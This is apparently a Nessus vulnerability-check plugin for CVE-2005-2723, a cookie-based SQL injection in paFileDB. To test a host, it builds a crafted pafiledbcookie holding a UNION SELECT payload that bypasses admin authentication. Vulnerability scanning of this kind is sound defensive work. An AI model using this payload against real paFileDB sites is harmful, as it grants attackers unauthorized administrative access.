#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19505);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2005-2723");
  script_bugtraq_id(14654);
  script_osvdb_id(18974);

  script_name(english:"paFileDB auth.php pafiledbcookie Cookie SQL Injection");
  script_summary(english:"Checks for pafiledbcookie SQL injection vulnerability in paFileDB");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote version of paFileDB suffers from a flaw by which an
attacker can gain access to the application's administrative control
panel by means of a SQL injection attack via a specially crafted
cookie. 

Note that successful exploitation requires that paFileDB be configured
with '$authmethod' set to 'cookies' and that PHP's 'magic_quotes_gpc'
setting be disabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.security-project.org/projects/board/showthread.php?t=947" );
 script_set_attribute(attribute:"solution", value:
"Edit '$authmethod' in 'pafiledb.php' to disable cookie-based
authentication." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/24");
 script_cvs_date("$Date: 2011/09/28 22:35:43 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_dependencies("pafiledb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/pafiledb");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/pafiledb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw.
  user = rand_str();
  passwd = SCRIPT_NAME;
  # nb: the exploit is composed of three fields joined by "|":
  #     1) MD5-encoded ip address of the attacking host
  #        (so if you're NAT'd, this won't work!)
  #     2) username along with the SQL injection.
  #     3) the password string
  exploit = string(
    hexstr(MD5(this_host())), "|", 
    user, "' UNION SELECT 1,2,'", passwd, "',4,5--", "|",
    passwd
  );
  set_http_cookie(name: "pafiledbcookie", value: urlencode(str:exploit));
  r = http_send_recv3(method: "GET", item:string(dir, "/pafiledb.php?action=admin"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if it looks like we logged in.
  if (egrep(string:r[2], pattern:string(user, "' UNION SELECT.+pafiledb.php?action=admin&ad=logout"))) {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
